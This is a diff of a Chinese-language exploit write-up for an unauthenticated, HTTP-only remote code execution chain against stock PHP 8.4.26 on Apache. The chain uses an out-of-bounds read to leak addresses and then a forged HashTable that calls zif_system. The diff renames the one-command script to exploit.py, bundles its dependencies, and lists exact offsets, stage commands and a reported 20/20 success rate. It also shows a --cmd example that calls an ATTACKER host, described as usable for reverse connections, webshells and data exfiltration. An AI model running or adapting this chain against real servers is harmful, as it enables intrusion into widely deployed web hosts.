@@ -39,7 +39,8 @@ session handler）上的**纯 HTTP** 链：不挂 gdb、不读目标 `/proc`、�
    `pDestructor = zval_ptr_dtor`。800KB 窗口里该指针出现 **1095 次**，
    于是 `libphp = 值 - 0x65EB60`。同时窗口里还有一个 2MiB 对齐的
    指针簇计数 87，聚类后正好是 **main chunk base**。
-6. **纯 HTTP 全链 RCE 已打通**：`pure/pwn_pure.py` 一条命令完成
+6. **纯 HTTP 全链 RCE 已打通**：根目录 `exploit.py`（`pure/pwn_pure.py`
+   保留为别名）一条命令完成
    A1（OOM）→ B1（越界读，同时算 libphp + main chunk）→ A2
    （cheap-OOM）→ B2（fake-ref + 伪造 HashTable，`pDestructor=zif_system`）
    → 目标内执行 `id`。加固后 **20/20**（带符号调试镜像 15 次 + 纯官方
@@ -245,7 +246,7 @@ LEAK_SPEC = "G:511:0x137" * 14 + "G:400:0x137" + "G:511:0x137" + "X:900"
   **真实 HashTable + Bucket 链**，`pDestructor` 指向 libphp 的
   `zval_ptr_dtor`，不是我们伪造的常量。
 
-### 6.2 窗口解析（`pwn_pure.py::parse_leak`）
+### 6.2 窗口解析（`exploit.py::parse_leak`）
 
 800KB 解码后按 qword 扫 0x7f… 指针，按 `& ~0x1fffff`（2MiB）聚类：
 
@@ -269,15 +270,15 @@ chunk buckets:
   （实测 0x1B99–0x1D80）。若不在，说明"出现最多的指针"是别的模块/
   别的世代的重复值，本次泄漏作废，重新 A1+B1（`--retries`，默认 3）。
 
-### 6.3 Stage-3（复用 `de0/`，纯 HTTP）
+### 6.3 Stage-3（依赖已内置到 `pure/`，纯 HTTP）
 
 ```
 S    = main + 0xF8398        # 将被伪造成 zend_array 的位置
 zif  = libphp + 0x465370     # zif_system
-A2   = de0/cheap_oom_a.py --parts 880 --depth 64 --fillers 115
+A2   = pure/cheap_oom_a.py --parts 880 --depth 64 --fillers 115
        -> hsv = main + 0x7D720（PS(hash_serialize_verifier) 指向堆）
-B2   = de0/mk_ht.py S zif "id>/out/p1" ht
-       de0/fake_ref_b.py --vl 384 --n1 500 --n2 495 --rc 1 \
+B2   = pure/mk_ht.py S zif "id>/out/p1" ht
+       pure/fake_ref_b.py --vl 384 --n1 500 --n2 495 --rc 1 \
             --ht-addr S --ht-file ht
 ```
 
@@ -313,16 +314,16 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
                                        # （--dbg 才用带符号镜像，仅标定）
 
 # 一条命令：A1 -> B1 泄漏 -> A2 -> B2 -> system(cmd)
-python3 pure/pwn_pure.py --port 18110
+python3 exploit.py --port 18110
 # 期望最后两行：
 # [4/4] RCE OK; proof .../out/p1:
 # uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 # 每次重启容器（新 ASLR）：
-python3 pure/pwn_pure.py --port 18110 --restart p2s-pure-18110
+python3 exploit.py --port 18110 --restart p2s-pure-18110
 
 # 自定义命令（回连、写 webshell、外带数据等）：
-python3 pure/pwn_pure.py --port 18110 \
+python3 exploit.py --port 18110 \
   --cmd 'php -r "file_get_contents(\\"http://ATTACKER/ok\\");"'
 ```
 
@@ -367,7 +368,8 @@ print(hex(Counter(qs).most_common(1)[0][0] - 0x65EB60))  # libphp
 | `pure/chunked_send.py` | chunked 发送 multipart body（绕过 post_max_size） |
 | `pure/mk_a1.py` | A1 body（OOM 形状；支持 query 由 `--path` 给） |
 | `pure/mk_leak_b.py` | B body：`A:<page>` 311-page forge、`G:<pages>:<page>` 全块 forge、`F/S` flood、`X:n` 数组字段 |
-| `pure/pwn_pure.py` | **一条命令全链**：A1 → B1（libphp+main）→ A2 → B2 → `system(cmd)`；含 delta 检查和重试 |
+| `exploit.py` | **一条命令全链**：A1 → B1（libphp+main）→ A2 → B2 → `system(cmd)`；含 delta 检查和重试（`pure/pwn_pure.py` 是它的别名） |
+| `pure/cheap_oom_a.py` / `mk_ht.py` / `fake_ref_b.py` | stage-3 依赖，已从 `de0/` 内置，保证仓库自包含 |
 | `pure/decode_cookie.py` | 解码响应里的 `Set-Cookie`，打印头部/聚类/指针计数 |
 | `pure/mk_b_min.py` | 最小 B + 槽位整形字段（标定用） |
 | `pure/mk_flood.py` | 早期 flood 生成器（保留） |
@@ -375,7 +377,8 @@ print(hex(Counter(qs).most_common(1)[0][0] - 0x65EB60))  # libphp
 | `pure/RESEARCH_PURE_128M.md` | 本文 |
 | 远端 `~/p2s-pure-1022/evidence/e_r1..3.resp` | 3 次 200 OK 越界读的原始响应 |
 | 远端 `~/p2s-pure-1022/evidence/pwn_pure_batch_20261022.log` | 加固后 6 连击（3 同 worker + 3 全新容器）全链日志 |
-| `pure/evidence/pwn_pure_official_20261022.log` | stock 官方 `php:8.4.26-apache` + 官方 `php.ini-production` 上 2 连击全链日志 |
+| `pure/evidence/pwn_pure_official_20261022.log` | stock 官方 `php:8.4.26-apache` + 官方 `php.ini-production` 上 3 连击全链日志 |
+| `pure/evidence/exploit_entry_20261022.log` | 根目录 `exploit.py` 与 `pure/pwn_pure.py` 别名各 1 次全链 |
 
 ## 9. 约束与免责声明
 
